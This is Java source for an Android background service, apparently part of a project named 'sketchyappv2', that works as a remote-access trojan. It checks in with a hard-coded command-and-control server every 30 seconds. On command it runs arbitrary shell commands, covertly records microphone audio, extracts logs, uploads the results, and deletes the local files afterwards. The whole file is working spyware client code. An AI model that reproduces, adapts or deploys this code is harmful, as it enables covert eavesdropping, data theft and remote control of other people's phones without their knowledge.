package com.twygonik.sketchyappv2;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class BackgroundService extends Service {

    /*
    Note all files are stored in DCIM storage, making it available to access
    even on non-rooted devices
    Files should be deleted after being sent to the command and control server
     */
    private static BackgroundService instance = null;  // Not used
    public final String SERVER_IP = "172.30.66.225"; // The IP or hostname where the server is being run
    public final String SERVER_DIRECTORY = "/fileupload"; // Default directory, all files handled by this directory
    public boolean connected = false; // Is the client connected or not
    public String command; // The command to be run
    public String devUUID = null; // This client's UUID
    public String filename; // The filename for upload
    public boolean fileUploaded = false; // Was the file uploaded?
    public int RECORD_TIME = 10; // Length of audio record time in seconds
    public boolean audioRecorded = false; // Has the audio been recorded yet?
    Utils utils = null; // A utils class, has methods that don't rely on these variables
    public static int INTERVAL = 1000 * 30; // Interval for check in in milliseconds

    public BackgroundService() {
    }

    public static BackgroundService getInstance() {
        if (instance == null) {
            instance = new BackgroundService();
        }
        return instance; // Returns an instance of the backgroundService, Not used
    }

    @Override
    public IBinder onBind(Intent intent) {
        /*
        Used in anything requiring binder
        this project didn't require it, so it's just empty
         */
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // This is the method that is called when the service is started
        // starting the service
        final String LOG_TAG = "startService";
        utils = new Utils(getApplicationContext(), getBaseContext(), getContentResolver()); // Create new utils class used throughout service
        devUUID = utils.UUIDgen(); // generates this device's UUID
        Thread connectionThread = new Thread(new ConnectionThread()); // Create a new thread to initiate the connection to server
        connectionThread.start(); // Start the thread
        try {
            connectionThread.join(); // Wait for the thread to finish
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        Timer timer = new Timer(); // Create a new timer
        timer.schedule(new TimerTask() { // Schedule a timerTask to run
            @Override
            public void run() {
                Thread checkinThread = new Thread(new CheckinThread()); // Create new checkinThread
                checkinThread.start(); // Start the thread
            }
        }, INTERVAL, INTERVAL); // Wait 30 seconds, then run the thread every 30 seconds
        return START_STICKY;  // Returns when method complete
    }

    public void onDestroy() {
        /*
        destroys the service
        This isn't called directly,  may be called when app is closed
         */
        super.onDestroy();
        Log.e("Service Destroy", "Destroying service");
    }

    public boolean handleCommand(String commands) {
        final String LOG_TAG = "handleCommand";
        String[] values = commands.split("&"); // Split the parameters on &
        String[] value1 = values[0].split("="); // Split each parameter on =
        if (value1[0].equals("command")) { // If the first
            // parameter is command
            command = value1[1]; // The current command is hte first parameter
            switch (command) {
                case "getlog":
                    // getlog should have no other values other than getlog
                    // the filename for getlog will always be the time the log was requested
                    // We ignore any value provided
                    File log = utils.extractLog(); // Call the extractlog method, the File object is returned
                    filename = log.getName(); // Get the filename and store it for use throughout the service class
                    Thread fileThread = new Thread(new FileUploadThread()); // Create new thread to upload the file
                    fileThread.start(); // start the thread
                    return true; // We're good
                case "getaudio":
                    // Defaults to 10 seconds if not specified
                    // Filename defaults to date/time format if not specified
                    String[] commandValue = values[1].split("="); // Get the value from the parameters
                    if (commandValue[0].equals("value")) {
                        String tempLength = commandValue[1]; // this is the value to be run
                        try {
                            int length = Integer.parseInt(tempLength);
                            RECORD_TIME = length;
                        } catch (NumberFormatException e) {
                            Log.e(LOG_TAG, "Value is not an integer");
                            // we return true to not trigger an infinite loop
                            // The app will attempt to get the proper value on next checkin
                            // Serverside should also do checking of the value to make sure it's
                            // a reasonable integer value
                            return true;
                        }
                    } else {
                        RECORD_TIME = 10; // Default to 10 seconds
                    }
                    Date datum = new Date();
                    SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss", Locale.US); // Filename based on the current date/time
                    String audioFileName = df.format(datum);
                    Boolean yes = audioHandler(audioFileName); // Call the method that handles the audio
                    while (!audioRecorded) {
                        // This is NOT efficient
                        // This waits for the audio to stop recording before uploading the file
                    }
                    //filename = audioFileName + ".3gp"; // add the file extension to the filename
                    Thread audioFileThread = new Thread(new FileUploadThread()); // start fileupload thread
                    audioFileThread.start();
                    return true; //we're good
                case "runshell":
                    // this command must have a value
                    // if it does not, we'll just wait until the next check in time
                    String[] shellValue = values[1].split("=");
                    if (shellValue[0].equals("value")) {
                        String shellCommand = shellValue[1]; // value of shell command to run
                        File commandOutput = utils.runShellCommand(shellCommand); // output of the shell command is stored in file
                        filename = commandOutput.getName();
                        Thread shellThread = new Thread(new FileUploadThread()); // upload the file
                        shellThread.start();
                        return true; // we're good
                    }
                    return true; // do nothing
            }
        } else {
            return false; // Bad request sent
        }
        return false; // Bad request sent
    }

    public boolean audioHandler(String audioFileName) {
        final String LOG_TAG = "audioThread";
        final Utils.AudioRecord recordTest = new Utils.AudioRecord(audioFileName); // create new audioRecord class
        boolean mStartRecording = true;
        recordTest.onRecord(mStartRecording); // Start recording
        final boolean mStopRecording = false;
        Timer audioTimer = new Timer(); // New timer
        audioTimer.schedule(new TimerTask() {
            @Override
            public void run() {
                Log.e(LOG_TAG, "Stopping recording");
                recordTest.onRecord(mStopRecording);
                audioRecorded = true; // Tell the command handler that audio is done recording
            }
        }, RECORD_TIME * 1000); // After this time, stop recording
        filename = audioFileName + ".3gp"; // add the file extension
        return true; // Return true
    }

    class ConnectionThread implements Runnable {
        /* this class is used to check the connection
            including seeing if the server is still up,
            and checking for commands to be run.
            If a file must be uploaded, or data sent, it uses
            a different thread to do so
         */
        private final static String LOG_TAG = "ConnectionThread";
        private String url; // The url to connect to
        @Override
        public void run() {
            try {
                int responseCode = 0;
                String strResponse = "";
                int attempts = 0;
                if (connected) {
                    url = "http://" + SERVER_IP + "/checkin"; // If we've already connected, set it to checkin
                } else {
                    url = "http://" + SERVER_IP + "/connect"; // Otherwise we connect for the first time
                }
                do {
                    if (attempts > 0) {
                        Thread.sleep(5000); // Should not do this
                    } else if (attempts == 10) {
                        break; // Break the while loop
                    }
                    String data = "UUID=";
                    String UUID = devUUID;
                    data = data + UUID; // First post param is device UUID, only thing sent in connection thread
                    URL postURL = new URL(url); // new URL object
                    HttpURLConnection conn = (HttpURLConnection) postURL.openConnection(); // new HttpURLConnection
                    conn.setRequestMethod("POST"); // Post request method
                    OutputStream os = conn.getOutputStream(); // Get the output stream from the connection
                    Log.e(LOG_TAG, "Writing");
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                    writer.write(data); // Write the data out
                    writer.flush(); // Flush
                    conn.connect(); // close
                    Log.e(LOG_TAG, "BufferedReader");
                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    String responseline = null;
                    StringBuilder response = new StringBuilder(); // Get response back from the server
                    Log.e(LOG_TAG, "Starting response build");
                    while ((responseline = br.readLine()) != null) {
                        Log.e(LOG_TAG, "Building response ");
                        response.append(responseline);
                    }
                    writer.close(); // close the writer
                    os.close(); // Close the outputstream
                    br.close(); // Close buffered reader
                    strResponse = response.toString();// Get the response tostring
                    responseCode = conn.getResponseCode(); // Get the HTTP response code
                    Log.e("Response: ", strResponse);
                    if (strResponse.equals("OK") && responseCode == 200) {
                        connected = true; // We've connected
                        break;
                    } else if (strResponse.equals("CONNECTED")) {
                        // We already connected
                        break;
                    }
                    attempts++; // Increase number of attempts
                } while (!strResponse.equals("OK") && responseCode != 200); // Do while the response isn't OK
                if (attempts == 10) {
                    Log.e(LOG_TAG, "Attempted connection failed!");
                }
            } catch (Exception e) {
                Log.e(LOG_TAG, "Got exception");
                e.printStackTrace();
            }
        }
    }

    class CheckinThread implements Runnable {
        /*
        Similar to the connection thread, but executes requested commands and
        repeats its execution every 30 seconds
         */
        private final static String LOG_TAG = "checkIn";
        // we manually specify the directory
        private String url = "http://" + SERVER_IP + "/checkin";
        @Override
        public void run() {
            // after check in, server should respond with command type: value/command
            // Example runshell:pwd
            int attempts = 0;
            try {
                String strResponse = "";
                do {
                    if (attempts > 0) {
                        Thread.sleep(5000); // probably shouldn't use this, it also sleeps the UI Thread
                    } else if (attempts == 10) {
                        break;
                    }
                    // This code block is similar to the connect thread
                    // Calls handleCommand at the end and has logic to handle different responses
                    String data = "UUID=";
                    String UUID = devUUID;
                    data = data + UUID;
                    URL postURL = new URL(url);
                    HttpURLConnection conn = (HttpURLConnection) postURL.openConnection();
                    conn.setRequestMethod("POST");
                    OutputStream os = conn.getOutputStream();
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                    writer.write(data);
                    writer.flush();
                    writer.close();
                    os.close();
                    conn.connect();
                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    String responseline = null;
                    StringBuilder response = new StringBuilder();
                    while ((responseline = br.readLine()) != null) {
                        response.append(responseline);
                    }
                    br.close();
                    strResponse = response.toString();
                    String[] responseData = strResponse.split(":");
                    Log.e("Response: ", strResponse);
                    if (responseData[0].equals("OK")) {
                        connected = true;
                        break;
                    } else if (responseData[0].equals("CONNECTED")) {
                        // Parse the command and do what is requested
                        Boolean good = handleCommand(responseData[1]);
                        if (good) {
                            break;
                        }
                    }
                    attempts++;
                } while (!strResponse.equals("OK"));
                if (attempts == 10) {
                    Log.e(LOG_TAG, "Attempted connection failed!");
                }

            } catch (Exception e) {
                Log.e(LOG_TAG, "Got exception");
                e.printStackTrace();
            }
            if (attempts == 10) {
                Log.e(LOG_TAG, "Attempted connection failed!");
            }
        }
    }

    class FileUploadThread implements Runnable {
        /*
        This thread uploads a file to the server
        The specific file type directory (eg audio, log) is specifed
        in SERVER_DIRECTORY by the command handle method
         */
        private final static String LOG_TAG = "FileUpload";

        @Override
        public void run() {
            try {
                int responseCode = 0;
                String response = null;
                do {
                    // We can access the DCIM directory with the dangerous permission we requested
                    // All files we're uploaded must be here or in the apps file directory
                    String testfilename = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath();
                    testfilename += "/" + filename;
                    String sha256 = null;
                    try {
                        FileInputStream fis = new FileInputStream(testfilename);
                        sha256 = utils.sha256(fis); // Calculate sha256 hash of this file for integrity checking
                        Log.e(LOG_TAG, sha256);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    String fileurl = "http://" + SERVER_IP + SERVER_DIRECTORY; // /fileupload is the directory
                    URL fileURL = new URL(fileurl);
                    HttpURLConnection conn = (HttpURLConnection) fileURL.openConnection();
                    conn.setUseCaches(false);
                    conn.setDoOutput(true);
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Connection", "Keep-Alive");
                    conn.setRequestProperty("ENCTYPE", "multipart/form-data"); // Don't think this is necessary, all logic is handled serverside
                    conn.setRequestProperty("content-type", "multipart/form-data;boundary=******");
                    DataOutputStream request = new DataOutputStream(conn.getOutputStream());
                    String metadata = "UUID=" + devUUID + "&filename=" + filename + "&sha256=" + sha256 + "******"; // Append metadata to beginning of request
                    request.writeBytes(metadata); // Write the bytes out
                    File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), filename);
                    byte[] bFile = new byte[(int) file.length()];
                    FileInputStream fileInputStream = new FileInputStream(file);
                    fileInputStream.read(bFile); // Convert file to byte array
                    fileInputStream.close();
                    request.write(bFile); // write the byte array out
                    request.flush(); // flush the outputstream
                    request.close(); // close the stream

                    // We then build the server's response
                    InputStream responseStream = new BufferedInputStream(conn.getInputStream());
                    BufferedReader responseStreamReader = new BufferedReader(new InputStreamReader(responseStream));
                    String line = "";
                    StringBuilder stringBuilder = new StringBuilder();
                    while ((line = responseStreamReader.readLine()) != null) {
                        stringBuilder.append(line);
                    }
                    responseCode = conn.getResponseCode();
                    responseStreamReader.close();
                    response = stringBuilder.toString();
                    responseStream.close();
                    conn.disconnect();
                    // Response is BAD REQUEST if either the request is malformed or the file hash is incorrect
                    Log.e(LOG_TAG, "Response: " + response);
                }
                while (!(responseCode == 200 && response.equals("OK"))); // We're good! exit the thread
                fileUploaded = true;
                try {
                    // Attempt deleting the file
                    // This sometimes doesn't work
                    String deleteFileString = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath() + "/" + filename;
                    File deleteFile = new File(deleteFileString);
                    if (deleteFile.exists()) {
                        deleteFile.delete();
                    }
                } catch (Exception e) {
                    Log.e(LOG_TAG, "Exception while deleting file!");
                    e.printStackTrace();
                }

            } catch (IOException io) {
                Log.e(LOG_TAG, "Got IO exception ");
                io.printStackTrace();
            } catch (Exception e) {
                Log.e(LOG_TAG, "Got Exception");
                e.printStackTrace();
            }
        }
    }
}
